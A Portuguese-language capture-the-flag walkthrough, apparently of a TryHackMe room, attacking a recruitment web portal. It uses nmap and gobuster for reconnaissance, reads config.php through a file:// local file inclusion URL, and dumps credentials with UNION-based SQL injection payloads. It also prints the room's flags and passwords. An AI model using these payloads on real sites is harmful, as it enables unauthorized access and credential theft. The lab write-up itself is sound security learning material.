## Tags
#Hackthebox #tryhackme 

## Alvo
- Um site chamado recrutamento, devemos procurar vulnerabilidades nele para conseguir a bandeira de acesso como usuário e a como admin

## Objetivo
- Qual a flag após fazer login como usuário? -> THM{LOGGED_IN_USER}
- Qual a flag após fazer login como admin? -> THM{LOGGED_IN_ADM1N1}

## Ferramentas e scripts utilizados
- nmap
- gobuster dir
- gobuster dns
- gobuster vhost

## Resultados obtidos
Primeiro iremos mapear as portas que estão rodando no alvo e depois também com -sV e -sC.
```
sudo nmap -sS 10.65.181.117
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-07 08:56 -0400
Nmap scan report for 10.65.181.117
Host is up (0.14s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 4.99 seconds
```
Aqui vemos que tem o ssh , um servidor dns e o http rodando.
```
sudo nmap -sV -sC 10.65.181.117
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-07 08:56 -0400
Nmap scan report for 10.65.181.117
Host is up (0.14s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 21:4d:ea:aa:52:4b:e9:24:fa:55:1d:92:03:c2:0a:7d (RSA)
|   256 e4:d0:df:9b:b2:73:58:7d:08:15:d2:2e:29:02:4f:bf (ECDSA)
|_  256 f1:13:23:12:64:0c:a8:d3:11:09:bd:4b:54:77:c0:86 (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Recruit
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.83 seconds
```
Vemos pelo -sV e -sC que é um servidor apache 2.4.41 e o httponly não está ativado , podendo permitir XSS .

--- 
Iremos agora mapear mais a aplicação web em si com gobuster.
```
gobuster dir -u http://10.65.181.117 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,log,js,md
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.181.117
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,log,js,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
header.php           (Status: 200) [Size: 457]
mail                 (Status: 301) [Size: 313] [--> http://10.65.181.117/mail/]
index.php            (Status: 200) [Size: 1417]
assets               (Status: 301) [Size: 315] [--> http://10.65.181.117/assets/]
footer.php           (Status: 200) [Size: 289]
file.php             (Status: 200) [Size: 20]
api.php              (Status: 200) [Size: 4151]
javascript           (Status: 301) [Size: 319] [--> http://10.65.181.117/javascript/]
logout.php           (Status: 302) [Size: 0] [--> index.php]
config.php           (Status: 200) [Size: 0]
dashboard.php        (Status: 302) [Size: 457] [--> index.php]
phpmyadmin           (Status: 301) [Size: 319] [--> http://10.65.181.117/phpmyadmin/]
```
Com Gobuster conseguimos mapear essas rotas , iremos ver o mail agora.

---
- Mail/
Vemos na pasta de email um mail.log com o seguinte conteúdo.
```
May 14 09:32:11 recruit-server postfix/smtpd[2143]: connect from hr-workstation.local[10.10.5.23]
May 14 09:32:12 recruit-server postfix/smtpd[2143]: 4F1A2203F: client=hr-workstation.local[10.10.5.23]
May 14 09:32:13 recruit-server postfix/cleanup[2146]: 4F1A2203F: message-id=<20240514093213.4F1A2203F@recruit.local>
May 14 09:32:13 recruit-server postfix/qmgr[1789]: 4F1A2203F: from=<hr@recruit.thm>, size=1824, nrcpt=1 (queue active)
May 14 09:32:14 recruit-server postfix/local[2151]: 4F1A2203F: to=<it-support@recruit.local>, relay=local, delay=0.34, status=sent

------------------------------------------------------------
From: HR Team <hr@recruit.thm>
To: IT Support <it-support@recruit.thm>
Date: Tue, 14 May 2024 09:32:10 +0000
Subject: Recruitment Portal Deployment Confirmation

Hi Team,

Just a quick update to confirm that the new Recruitment Portal
has been deployed successfully and is functioning as expected.

Weâ€™ve completed basic validation:
- Login page is accessible
- Candidate dashboard loads correctly
- API documentation page is live

As discussed during deployment:
- HR login credentials (username: hr) are currently stored in the application
  configuration file (config.php) for ease of access during
  the initial rollout phase.
- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.

Please let us know if there are any issues or if further changes
are required.

Thanks,
HR Operations
Recruitment Team
------------------------------------------------------------

May 14 09:32:14 recruit-server postfix/qmgr[1789]: 4F1A2203F: removed
```
Adicionei o dominio recruit.thm e recruit.local no /etc/hosts/ , assim testei DNS para esses dominios e não achei nada , irei testar subdominios e vhosts.
```
┌──(kali㉿kali)-[~]
└─$ gobuster dns -do recruit.thm --resolver 10.65.181.117 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --no-error
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     recruit.thm
[+] Threads:    10
[+] Resolver:   10.65.181.117
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Progress: 190 / 19966 (0.95%)^C
                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ gobuster dns -do recruit.thm --resolver 10.65.181.117 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --no-error -t 100
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     recruit.thm
[+] Threads:    100
[+] Resolver:   10.65.181.117
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Progress: 19966 / 19966 (100.00%)
===============================================================
Finished
===============================================================
                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ gobuster vhost -u http://recruit.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --no-error --append-domain -t 100
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://recruit.local
[+] Method:                    GET
[+] Threads:                   100
[+] Wordlist:                  /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
#www.recruit.local Status: 400 [Size: 321]
#mail.recruit.local Status: 400 [Size: 321]
Progress: 19966 / 19966 (100.00%)
===============================================================
Finished
===============================================================
                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ gobuster vhost -u http://recruit.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --no-error --append-domain -t 100
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://recruit.thm
[+] Method:                    GET
[+] Threads:                   100
[+] Wordlist:                  /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
#www.recruit.thm Status: 400 [Size: 321]
#mail.recruit.thm Status: 400 [Size: 321]
Progress: 19966 / 19966 (100.00%)
===============================================================
Finished
===============================================================

```
Não obtive resultados com essas consultas , sem vhosts e subdomains válidos.

---
Iremos explorar a rota file.php agora.
Tentei usar paths absolutos e relativos nessa rota para ler config.php visto que ela condizia com 0 de size mas com um possivel LFI eu poderia ler esse arquivo , assim tive de usar o que eu citei em considerações
```
http://10.65.181.117/file.php?cv=file:///var/www/html/config.php
```
Com isso conseguie ler config.php e assim pegar a senha de hr.
```
<?php

/*
|--------------------------------------------------------------------------
| Application Configuration
|--------------------------------------------------------------------------
*/

$APP_NAME        = 'Recruit';
$APP_ENV         = 'production';
$APP_VERSION     = '1.2.4';
$APP_DEBUG       = false;

/*
|--------------------------------------------------------------------------
| HR Credentials (Temporary – Initial Rollout Phase)
|--------------------------------------------------------------------------
| NOTE:
| These credentials are stored here temporarily for ease of access
| during the initial deployment and will be moved to the database
| in a future release.
*/

$HR_PASSWORD = 'hrpassword123';

/*
|--------------------------------------------------------------------------
| API Configuration
|--------------------------------------------------------------------------
*/

$API_ENABLED     = true;
$API_VERSION     = 'v1';


?>
```
Loguei e recuperei a senha THM{LOGGED_IN_USER} .

---
Logo após logar caímos em uma pagina de dashboard que contém uma barra de pesquisa , nisso vejo que tem uma sql injection por acidente , digitei hr' e apareceu sql inband com verbosidade de erros no front end, coloquei ' e apareceu isso 
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
```
Indicando que a pesquisa é feita com LIKE e userentrada%.
Após isso usei UNION SELECT 1,2,3,4 e consegui descobrir a quantidade de colunas , coloquei database() no lugar do 4 e descobri o banco de dados , com isso parti para a seguinte sql 
```
xxxxx' UNION SELECT 1,2,3,group_concat(table_name) from information_schema.tables where table_schema='recruit_db' ;#
```
Assim descobri dois nomes de tabelas.Candidates e users. Irei enumerar users.
Descobri que users tinha 3 colunas sendo elas id , password e username , nisso usei a seguinte sql
```
xxxxx' UNION SELECT 1,2,3,group_concat(username,":",password,"-") from users ;#
```
Recuperei isso aqui admin:admin@001admin-, com isso vamos agora acessar como admin o login normal.
Nisso conseguimos a outra flag THM{LOGGED_IN_ADM1N1} .

## Considerações
- file:// é o wrapper padrão para acessar arquivos pelo php para acessar o sistema de arquivos locais, tive de pesquisar pois caminhos normais no file.php ele não aceitava , fiquei preso demais nessa parte , então vi que esse wrapper podia permitir se não tivesse sendo sanitizado de eu fazer isso para arquivos locais. Se a aplicação for php e tiver rotas de leitura de arquivos então devemos testar file:// ou rotas normais mesmo.
- uma sql injection podemos usar " ,' , -- , # , depende da sintaxe do banco , nesse sql injection tive de usar ' e # , diferente do normal que uso ' e -- , devemos fazer todas as tentativas possíveis, nesse caso eu usei -- sem colocar espaço no final e deu erro , usei # e não deu erro sem espaço , depois que fui analisar que quando usar -- deve se colocar espaço no final.


